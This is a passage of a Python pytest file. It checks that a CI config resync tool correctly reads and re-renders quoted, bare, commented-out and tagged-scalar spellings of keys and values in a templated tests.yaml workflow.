    assert unpreserved_tests_yaml_declarations(text, canonical) == ["secrets"]


@pytest.mark.parametrize("quote", ['"', "'"], ids=["double", "single"])
def test_quoted_force_external_runtime_is_read(quote: str) -> None:
    """A quoted ``"force-external-runtime": true`` must not be silently dropped.

    Read through ``extract_field``, which used to anchor on the bare spelling —
    a quoted key returned ``""`` and ``--resync`` deleted the line, booting the
    connector into ``DaprNotDetectedError`` (FND-65) through a spelling the
    reader missed.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace(
        "      app-name:",
        f"      {quote}force-external-runtime{quote}: true\n      app-name:",
        1,
    )
    assert extract_force_external_runtime(text) == "true"


@pytest.mark.parametrize("quote", ['"', "'"], ids=["double", "single"])
def test_quoted_app_name_is_not_renamed(quote: str) -> None:
    """A quoted ``"app-name"`` must be carried, not reverted to the default.

    The read-back was anchored on the bare spelling of the *key*, so a quoted
    key read as absent and the identity guard then skipped the resync — leaving
    the app's CI config permanently un-resyncable.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace(
        '      app-name: "widget"', f'      {quote}app-name{quote}: "widget"', 1
    )
    assert extract_tests_yaml_params(text)["app_name"] == "widget"


@pytest.mark.parametrize(
    "value", ["widget", "'widget'", '"widget"'], ids=["bare", "single", "double"]
)
def test_app_identity_value_spelling_round_trips(value: str) -> None:
    """Every valid spelling of the app-identity *values* must be carried.

    The key dimension was fixed first; the two readers still demanded a
    double-quoted *value*, so a hand-written ``app-name: widget`` read as absent.
    The identity guard then skipped every ``--resync`` of that file ("drifted too
    far"), leaving the repo's CI config permanently stale — the same
    hand-written-spelling class as the services-script line, which two real repos
    hit. Asserted through the round trip, not just the read, so a value that is
    read but then re-rendered differently still fails.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace(
        '      app-name: "widget"', f"      app-name: {value}", 1
    ).replace(
        '      app-image-name: "atlan-widget-app"',
        f"      app-image-name: {value.replace('widget', 'atlan-widget-app')}",
        1,
    )
    params = extract_tests_yaml_params(text)
    assert params["app_name"] == "widget"
    assert params["app_image_name"] == "atlan-widget-app"
    rendered = render("tests.yaml", **params)
    # The value is carried, the re-render is the canonical spelling, and the
    # guard sees nothing dropped.
    assert '      app-name: "widget"' in rendered
    assert unpreserved_tests_yaml_declarations(text, rendered) == []


@pytest.mark.parametrize(
    "value", ["false", "'false'", '"false"'], ids=["bare", "single", "double"]
)
def test_enable_e2e_value_spelling_round_trips(value: str) -> None:
    """A quoted ``enable-e2e`` must be carried, not dropped to the default.

    Same anchored-on-one-value-spelling defect as the app-identity pair: the
    reader took only a bare ``true``/``false``, so a quoted ``"false"`` read as
    absent and the re-render omitted the line — which, left unguarded, would
    re-enable e2e on a repo that had turned it off. The round-trip guard did
    refuse it, so the resync failed loudly rather than silently; reading the
    value is what lets it succeed instead.
    """
    canonical = render("tests.yaml", app_name="widget", enable_e2e="false")
    text = canonical.replace("      enable-e2e: false", f"      enable-e2e: {value}", 1)
    params = extract_tests_yaml_params(text)
    assert params["enable_e2e"] == "false"
    rendered = render("tests.yaml", **params)
    assert "      enable-e2e: false" in rendered
    assert unpreserved_tests_yaml_declarations(text, rendered) == []


def test_unreadable_enable_e2e_value_is_left_to_the_guard() -> None:
    """A non-boolean ``enable-e2e`` is not guessed at.

    Reading it as ``"true"``/``"false"`` either way would re-render a value the
    file does not declare. Omitting it instead lets the round-trip guard refuse
    the resync, which is the fail-safe direction.
    """
    canonical = render("tests.yaml", app_name="widget", enable_e2e="false")
    text = canonical.replace("      enable-e2e: false", "      enable-e2e: maybe", 1)
    assert "enable_e2e" not in extract_tests_yaml_params(text)


@pytest.mark.parametrize("quote", ['"', "'"], ids=["double", "single"])
def test_extract_field_quoted_value_keeps_spaces(quote: str) -> None:
    """A quoted value containing spaces survives whole.

    Stopping at the first whitespace would hand the caller a truncated value —
    a silent rewrite of the very declaration the reader exists to preserve.
    """
    assert extract_field(f"k: {quote}a b{quote}\n", "k") == "a b"


def test_extract_field_bare_value_stops_at_whitespace() -> None:
    """A bare value still ends at the first whitespace, so a trailing comment
    stays out of it."""
    assert extract_field("k: v # note\n", "k") == "v"


@pytest.mark.parametrize(
    "value",
    ["scripts/svc.sh", "'scripts/svc.sh'", '"scripts/svc.sh"'],
    ids=["bare", "single", "double"],
)
def test_services_script_value_spelling_round_trips(value: str) -> None:
    """Every valid spelling of ``services-script`` yields the same path.

    The single-quoted form is the one that bit: the old reader's bare arm
    excluded only ``"`` and ``#``, so ``'scripts/svc.sh'`` matched *with the
    quotes attached* and was re-rendered into the path itself. The round-trip
    guard cannot catch that — the key is present on both sides, only the value
    changed — so it was a silent corruption rather than a refusal.
    """
    canonical = render(
        "tests.yaml", app_name="widget", services_script="scripts/svc.sh"
    )
    text = canonical.replace(
        '      services-script: "scripts/svc.sh"', f"      services-script: {value}", 1
    )
    params = extract_tests_yaml_params(text)
    assert params["services_script"] == "scripts/svc.sh"
    rendered = render("tests.yaml", **params)
    assert '      services-script: "scripts/svc.sh"' in rendered
    assert unpreserved_tests_yaml_declarations(text, rendered) == []


@pytest.mark.parametrize(
    "value", ["95", "'95'", '"95"'], ids=["bare", "single", "double"]
)
def test_unit_coverage_value_spelling_round_trips(value: str) -> None:
    """A single-quoted coverage floor is preserved like the other two spellings.

    Read as absent it reached the round-trip guard as a dropped declaration, so
    the resync refused instead of preserving an app's own raised coverage bar.
    """
    canonical = render("tests.yaml", app_name="widget", unit_coverage_fail_under="95")
    text = canonical.replace(
        '      unit-coverage-fail-under: "95"',
        f"      unit-coverage-fail-under: {value}",
        1,
    )
    assert extract_declared_unit_coverage_fail_under(text) == "95"
    params = extract_tests_yaml_params(text)
    assert params["unit_coverage_fail_under"] == "95"
    assert (
        unpreserved_tests_yaml_declarations(text, render("tests.yaml", **params)) == []
    )


def test_commented_out_app_name_is_not_read_back() -> None:
    """A commented-out ``app-name`` must not satisfy the read-back.

    It names a value the file no longer declares; reading it would re-render the
    app under a name it had removed. ``structural_lines`` blanks the comment, so
    the scoped read cannot see it and the identity guard skips instead.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace(
        '      app-name: "widget"', '      # app-name: "widget"', 1
    )
    assert "app_name" not in extract_tests_yaml_params(text)


def test_declared_keys_normalises_a_quoted_key() -> None:
    """A quoted key lands in the same set as its bare spelling.

    The guard compares *sets of key names*; a quoted spelling kept distinct
    would read as a dropped declaration on one side and an added one on the
    other, so the same declaration would refuse its own round-trip.
    """
    assert declared_keys('    "secrets":\n      A: b') == ["secrets", "A"]
    assert declared_keys("    'secrets':\n      A: b") == ["secrets", "A"]


# --- Tagged / indent-first scalar headers (the scalar-header class) ----------


@pytest.mark.parametrize(
    "header",
    ["!!str |", "!custom >-", "!<tag:x> |", "|2-", "|2+"],
    ids=[
        "tagged-pipe",
        "tagged-custom",
        "verbatim-tag",
        "indent-first-minus",
        "indent-first-plus",
    ],
)
def test_tagged_and_indent_first_scalar_bodies_are_not_mined(header: str) -> None:
    """A scalar body must stay opaque no matter how its header is spelled.

    ``_BLOCK_SCALAR_RE`` used to know only untagged, chomping-first headers, so
    a ``run: !!str |`` or ``run: |2-`` body was mined as structure — and a
    ``uses:``/``with:`` quoted inside it hoisted into the rendered job, the very
    FND-65-reverse class ``structural_lines`` was added to stop.
    """
    text = (
        "jobs:\n  tests:\n    steps:\n"
        f"      - run: {header}\n"
        "          uses: atlanhq/application-sdk/.github/workflows/tests-reusable.yaml@main\n"
        "          force-external-runtime: true\n"
    )
    assert declared_keys(text) == ["jobs", "tests", "steps", "run"]
    assert extract_force_external_runtime(text) == ""
